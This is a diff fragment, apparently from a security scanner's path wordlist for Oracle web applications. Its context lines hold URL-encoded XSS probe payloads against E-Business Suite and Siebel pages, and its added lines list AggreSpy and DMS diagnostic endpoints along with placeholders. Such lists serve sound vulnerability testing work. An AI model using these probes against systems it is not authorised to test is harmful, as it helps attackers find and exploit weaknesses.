@@ -28,3 +28,11 @@
 /OA_HTML/oksAutoRenewalHelp.jsp%3Fthanks%3D%27%22%3E%3Csvg%2Fonload%3Dalert(
 /OA_HTML/ieuiMeetingErrorDisplay.jsp%3FErrCode%3D%27%22%3E%3Csvg%2Fonload%3Dalert(
 /loyalty_enu/start.swe/%3E%22%3E%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E
+{{paths}}
+/oracle-apps-framework-file-upload
+/path/to/vulnerable/component
+/AggreSpy
+/servlet/AggreSpy
+/dms/AggreSpy
+/dms0/AggreSpy
+/dmsoc4j/AggreSpy
